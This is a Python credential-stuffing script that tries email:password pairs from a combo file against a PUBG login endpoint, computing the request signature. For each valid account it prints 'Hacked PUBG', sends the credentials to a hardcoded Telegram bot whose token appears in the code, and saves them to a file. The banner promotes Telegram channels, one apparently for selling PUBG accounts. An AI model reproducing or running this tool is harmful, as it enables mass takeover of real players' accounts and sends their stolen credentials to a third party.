try:
    import requests,hashlib,random,string,time
except:
    os.system("pip install requests ;python PUBG-CHECK.py")
r = requests.session()
print("""

\033[1;93m

░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝
██║░░╚═╝███████║█████╗░░███████║█████═╝░
██║░░██╗██╔══██║██╔══╝░░██╔══██║██╔═██╗░
╚█████╔╝██║░░██║███████╗██║░░██║██║░╚██╗
░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝

██╗░░░░░██╗███╗░░██╗██╗░░██╗
██║░░░░░██║████╗░██║██║░██╔╝
██║░░░░░██║██╔██╗██║█████═╝░
██║░░░░░██║██║╚████║██╔═██╗░
███████╗██║██║░╚███║██║░╚██╗
╚══════╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝

███████╗███╗░░░███╗░█████╗░██╗██╗░░░░░
██╔════╝████╗░████║██╔══██╗██║██║░░░░░
█████╗░░██╔████╔██║███████║██║██║░░░░░
██╔══╝░░██║╚██╔╝██║██╔══██║██║██║░░░░░
███████╗██║░╚═╝░██║██║░░██║██║███████╗
╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝

██████╗░██╗░░░██╗██████╗░░██████╗░
██╔══██╗██║░░░██║██╔══██╗██╔════╝░
██████╔╝██║░░░██║██████╦╝██║░░██╗░
██╔═══╝░██║░░░██║██╔══██╗██║░░╚██╗
██║░░░░░╚██████╔╝██████╦╝╚██████╔╝
╚═╝░░░░░░╚═════╝░╚═════╝░░╚═════╝░
        
        \033[1;97mChanel Telgram==Termux-kalilinux
        Chanel T.me   ==Tarmay
        user Chanel   ==@darkweeb9
        user T.me     ==@sell_pubg9
""")
ID= '1534405523'
token = '1777630533:AAFGaMUK-eorx5z-8b5Ko0xcm_LJ2mFHoCc'
headPUB = {
	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
def CHECK(email,pess):
  eml = email
  pas = pess
  YES = f"""
\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;94m Hacked PUBG :
\033[1;97m[\033[1;92m✓\033[1;97m]\033[1;91m Email\033[1;97m: {eml}
\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;91mPass\033[1;97m: {pas}
\033[1;90m━━━━━━━━━━━━━"""
  NO = f"""
\033[1;97m[\033[1;92m-\033[1;92m]\033[1;94m NOT Hacked PUBG :
\033[1;97m[\033[1;92m-\033[1;92m] \033[1;91mEmail\033[1;97m: {eml}
\033[1;97m[\033[1;92m-\033[1;92m]\033[1;91m Pass\033[1;97m: {pas}
\033[1;90m━━━━━━━━━━━━━"""
  pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
  J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
  url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
  daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
  time.sleep(0.5)
  GO=r.get(url, data=daPU,headers=headPUB).text
  if '"token"' in GO:
    print(YES)
    r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\n')
    with open('NWE-PUBG.txt', 'a') as x:
      x.write(eml+':'+pas+' |@AhmedoPlus\n')
  else:
    import os
def FILname():
  F = input('[+] Enter the name the combo file : ')
  try:
    for x in open(F,'r').read().splitlines():
      email = x.split(":")[0]
      pess = x.split(":")[1]
      CHECK(email,pess)
  except FileNotFoundError:
    print('\n[-] The file name is incorrect !\n')
    return FILname()
FILname()
